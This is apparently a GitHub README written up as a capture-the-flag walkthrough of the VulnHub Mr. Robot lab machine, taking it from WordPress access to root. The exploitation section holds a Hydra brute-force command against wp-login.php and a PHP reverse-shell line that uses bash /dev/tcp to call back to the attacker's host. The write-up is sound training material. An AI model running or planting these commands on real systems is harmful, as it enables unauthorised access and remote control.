# 🛡️ Operation: Mr. Robot Infiltration

**RootProwler Advanced Pentest | VulnHub | Full Chain: Web → Internal → Root**

---

## Overview
Welcome to the Operation: Mr. Robot Infiltration! This repository contains the documentation for the penetration testing conducted on the Mr. Robot vulnerable machine. The goal was to exploit and escalate privileges on a WordPress-based web server running on Apache, ultimately gaining root access and capturing flags.

---

## Table of Contents
- 📋 Project Overview
- ⚙️ Setup
- 🛠 Tools Used
- 🎯 Target Information
- 🔍 Steps to Complete the Pentest
  1. Reconnaissance
  2. Exploitation
  3. Privilege Escalation
  4. Flag Capture
- 🏁 Conclusion
- 📚 Lessons Learned
- 💡 Credits

---

## 📋 Project Overview
This repository outlines the process of conducting a black-box pentest on the Mr. Robot vulnerable machine. We perform reconnaissance, exploitation, privilege escalation, and ultimately capture flags from the system.

The steps in this project are broken down methodically to ensure you understand the process and can replicate or learn from this engagement.

---

## ⚙️ Setup
### Prerequisites
- Kali Linux (Attacker Machine)
- Mr. Robot VM (Target Machine)
- Network Configuration: Both the Kali and Mr. Robot VMs must be on the same network segment (use Bridged or Host-only adapter).

---

## 🛠 Tools Used
- **Nmap**: For reconnaissance and service enumeration.
- **Gobuster**: Directory/file enumeration tool.
- **Hydra**: Brute force tool for cracking weak credentials.
- **Netcat**: For reverse shell and connection back to the attacker.
- **PHP Reverse Shell**: Used for web shell exploitation.

---

## 🎯 Target Information
- **IP Address**: 192.168.254.133
- **Web Application**: WordPress running on Apache HTTPD
- **Open Ports**: 80 (HTTP)

---

## 🔍 Steps to Complete the Pentest

### 1. Reconnaissance
The first step involves gathering as much information as possible about the target.

**Nmap Scan:**
```bash
nmap -sS -A -p- 192.168.254.133
```
**Results:**
- Port 80: Apache HTTPD
- WordPress running on the target machine.

---

### 2. Exploitation
**WordPress Login Brute Force:**
Using Hydra to attempt brute force login on the WordPress page.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.254.133 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Dashboard"
```

**Web Shell Upload:**
Exploiting the 404.php file of the Twenty Fifteen WordPress Theme to upload a PHP reverse shell.
```php
<?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.254.135/4444 0>&1'");
?>
```
Once the file is uploaded and triggered, a reverse shell will connect back to the attacker.

---

### 3. Privilege Escalation
**From www-data to robot:**
- MD5 Hash found in `/home/robot/password.raw-md5` was cracked to reveal the password `robot1234`.

**From robot to root:**
- Searching for SUID binaries led to `nmap`, which had the SUID bit set.
- Privilege escalation through `nmap` allowed us to spawn a shell as root.

---

### 4. Flag Capture
**Captured Flags:**
- Flag1: `/home/robot/flag1.txt`
- Flag2: `/root/flag2.txt`
- Root Flag: `/root/root-flag.txt`

---

## 🏁 Conclusion
This pentesting engagement on Mr. Robot successfully captured all flags and escalated privileges from a web application vulnerability (WordPress) all the way to root access.

---

## 📚 Lessons Learned
- **Strong Authentication**: Always ensure strong passwords and implement two-factor authentication (2FA) to prevent brute-force attacks.
- **File Upload Security**: Properly validate and sanitize user inputs to avoid web shell uploads.
- **Privilege Escalation**: Always be on the lookout for SUID binaries or other misconfigurations that can lead to privilege escalation.

---

## 💡 Credits
- **Mr. Robot**: VulnHub (for providing the vulnerable machine)
- **PHP Reverse Shell**: PentestMonkey
- **Tools Used**: Nmap, Hydra, Netcat, Gobuster, etc.

